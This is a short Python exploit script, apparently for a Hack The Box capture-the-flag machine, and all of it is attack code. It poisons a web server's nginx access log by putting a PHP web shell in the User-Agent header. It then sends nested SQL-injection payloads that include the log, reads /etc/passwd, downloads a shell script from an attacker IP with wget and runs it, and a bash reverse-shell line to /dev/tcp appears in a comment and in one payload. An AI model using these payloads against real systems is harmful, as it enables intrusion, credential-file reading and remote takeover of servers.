#!/usr/bin/python
import requests, sys

if len(sys.argv) < 3:
    print("[+]Usage %s target(www.nestedflanders.htb) attackerIP"%(sys.argv[0]))
    exit(0)

# create following shell script, linsten on port 80 for http server and listen on port 443 for rev shell
# /bin/bash -i >& /dev/tcp/10.10.14.67/443 0>&1

target = sys.argv[1]
attackerIP = sys.argv[2]

url = "https://%s/index.php"%(target)
headers = {"User-Agent": "<?php system($_REQUEST['cmd']); ?>"}
proxies = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}

req = requests.get(url=url, headers=headers, proxies=proxies, verify=False)

payload = "?cmd=cat /etc/passwd&id=465' and 1=2 union select ''' union select \"/var/log/nginx/access.log\"-- -'-- -"

req = requests.get(url=url+payload, proxies=proxies, verify=False)

payload = "?cmd=wget http://%s/shell.sh -O /tmp/shell.sh&id=465' and 1=2 union select ''' union select \"/var/log/nginx/access.log\"-- -'-- -/bin/bash -i >& /dev/tcp/10.10.14.67/4444 0>&1"%(attackerIP)

req = requests.get(url=url+payload, proxies=proxies, verify=False)

payload = "?cmd=bash /tmp/shell.sh&id=465' and 1=2 union select ''' union select \"/var/log/nginx/access.log\"-- -'-- -"

req = requests.get(url=url+payload, proxies=proxies, verify=False)
